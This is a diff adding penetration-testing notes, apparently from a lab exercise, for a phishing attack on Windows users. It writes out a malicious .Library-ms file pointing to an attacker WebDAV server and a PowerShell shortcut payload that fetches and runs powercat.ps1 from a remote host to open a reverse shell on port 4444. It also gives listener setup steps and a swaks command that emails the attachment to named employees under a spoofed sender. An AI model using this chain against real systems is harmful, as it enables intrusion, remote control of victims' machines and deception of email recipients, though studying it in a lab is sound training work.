@@ -1,4 +1,42 @@
-Save a file named config.Libray-ms
+Save a file named config.Libray-ms on a Windows Machine:
+==============================================
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.45.162</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+==============================================
+
+# Create a new shortcut file with payload, called "install":
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.162:8000/powercat.ps1'); powercat -c 192.168.45.162 -p 4444 -e powershell"
+
+==============================================
+@KALI
+==============================================
+Save config.Library-ms and install to webdav path.
+Serve at port 8000 powercat.ps1
+Start nc at 4444
+==============================================
+
+# Create a file body.txt with content.
+# Send the email:
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.241.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+
+
 
 With this content:
 WTF: libraryDescription shows the namespace for the version of the library file format starting from Windows 7
